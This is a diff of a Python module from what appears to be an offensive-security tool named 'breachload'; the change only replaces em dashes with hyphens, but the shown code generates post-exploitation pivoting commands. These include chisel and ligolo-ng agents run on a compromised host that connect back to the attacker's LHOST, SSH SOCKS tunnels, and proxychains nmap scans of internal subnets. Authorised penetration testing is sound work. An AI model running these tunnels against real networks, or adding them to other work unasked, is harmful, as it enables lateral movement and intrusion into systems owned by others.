@@ -1,12 +1,12 @@
-"""Pivoting / tunnelling planner — reach internal subnets through a foothold.
+"""Pivoting / tunnelling planner - reach internal subnets through a foothold.
 
 Once breachload has code execution on an edge host, the interesting network is
 usually *behind* it: a second subnet the attacker box can't route to. This module
-generates the ready-to-run tunnelling commands for the common methods — sshuttle,
-chisel, ligolo-ng, and plain SSH port-forwards — with the engagement's LHOST and the
+generates the ready-to-run tunnelling commands for the common methods - sshuttle,
+chisel, ligolo-ng, and plain SSH port-forwards - with the engagement's LHOST and the
 foothold/target details filled in, plus the one-line note on when to pick each.
 
-Pure command generation (no execution, no I/O) — the same guided, copy-paste-ready
+Pure command generation (no execution, no I/O) - the same guided, copy-paste-ready
 posture as `suggest`/`adchain`. The operator runs the pieces; breachload removes the
 "what's the exact syntax again?" tax that stalls a pivot mid-engagement.
 """
@@ -44,7 +44,7 @@ def pivot_plan(
     net = subnet or "10.0.0.0/24"
     opts: list[PivotOption] = []
 
-    # sshuttle — cleanest when we have SSH creds and want a transparent route.
+    # sshuttle - cleanest when we have SSH creds and want a transparent route.
     ssh_target = f"{ssh_user}@{via_host}" if ssh_user else f"<user>@{via_host}"
     opts.append(PivotOption(
         tool="sshuttle",
@@ -53,7 +53,7 @@ def pivot_plan(
         attacker_cmds=[f"sshuttle -r {ssh_target} {net} -x {via_host} "
                        f"--ssh-cmd 'ssh -p {ssh_port}'"]))
 
-    # SSH dynamic SOCKS — no extra tooling, then proxychains everything.
+    # SSH dynamic SOCKS - no extra tooling, then proxychains everything.
     opts.append(PivotOption(
         tool="ssh -D (dynamic SOCKS)",
         when="You have SSH creds and prefer a SOCKS proxy (proxychains) over a route.",
@@ -62,16 +62,16 @@ def pivot_plan(
                        f"# then: echo 'socks5 127.0.0.1 {socks_port}' >> /etc/proxychains.conf",
                        f"proxychains nmap -sT -Pn {net}"]))
 
-    # chisel — reverse SOCKS when you only have a shell (no SSH), through the foothold.
+    # chisel - reverse SOCKS when you only have a shell (no SSH), through the foothold.
     opts.append(PivotOption(
         tool="chisel (reverse SOCKS)",
-        when="You only have a webshell/command exec (no SSH) — tunnel back over HTTP.",
+        when="You only have a webshell/command exec (no SSH) - tunnel back over HTTP.",
         needs="Upload the chisel binary to the foothold (matching arch).",
         attacker_cmds=[f"chisel server -p {chisel_port} --reverse"],
         target_cmds=[f"./chisel client {lhost}:{chisel_port} R:{socks_port}:socks",
                      f"# attacker: proxychains -> socks5 127.0.0.1 {socks_port}"]))
 
-    # ligolo-ng — a real tun interface, nicest for scanning a whole subnet.
+    # ligolo-ng - a real tun interface, nicest for scanning a whole subnet.
     opts.append(PivotOption(
         tool="ligolo-ng",
         when="You want a real tun interface (full nmap, no proxychains) into the subnet.",
@@ -83,7 +83,7 @@ def pivot_plan(
         target_cmds=[f"./agent -connect {lhost}:11601 -ignore-cert",
                      "# in ligolo: session -> start"]))
 
-    # Plain SSH local forward — single internal service, no proxy stack.
+    # Plain SSH local forward - single internal service, no proxy stack.
     opts.append(PivotOption(
         tool="ssh -L (local forward)",
         when="You need just one internal service reachable locally (e.g. an internal DB).",
